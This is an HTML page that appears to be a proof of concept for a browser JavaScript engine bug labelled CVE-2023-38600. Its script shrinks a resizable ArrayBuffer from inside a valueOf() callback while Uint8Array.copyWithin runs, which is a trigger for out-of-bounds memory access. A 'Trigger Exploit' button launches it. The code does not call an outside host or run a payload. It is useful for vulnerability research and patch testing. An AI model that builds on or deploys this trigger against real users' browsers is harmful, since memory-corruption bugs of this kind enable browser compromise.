<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Resizable ArrayBuffer Exploit PoC</title>
  <style>
    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
    button { background: #222; color: #0f0; padding: 10px 20px; font-size: 16px; cursor: pointer; border: 1px solid #0f0; }
    pre { margin-top: 20px; }
  </style>
</head>
<body>
  <h1>CVE-2023-38600 - Resizable ArrayBuffer PoC</h1>
  <button onclick="trigger()">Trigger Exploit</button>
  <pre id="log"></pre>

  <script>
    const log = msg => document.getElementById("log").textContent += msg + "\n";

    function trigger() {
      try {
        log("[*] Creating resizable ArrayBuffer...");

        const rab = new ArrayBuffer(64, { maxByteLength: 128 });
        const u8 = new Uint8Array(rab);
        u8.set([1, 2, 3, 4, 5, 6, 7, 8]);

        const evilIndex = {
          valueOf() {
            rab.resize(8);  // shrink buffer during parameter evaluation
            log("[!] Resized buffer inside valueOf() to 8 bytes");
            return 4;
          }
        };

        log("[*] Before copyWithin: byteLength = " + rab.byteLength);
        u8.copyWithin(0, evilIndex);  // Triggers valueOf
        log("[*] After copyWithin: byteLength = " + rab.byteLength);
        log("[*] Array contents: " + Array.from(u8).join(", "));

      } catch (e) {
        log("[-] Error: " + e.message);
      }
    }
  </script>
</body>
</html>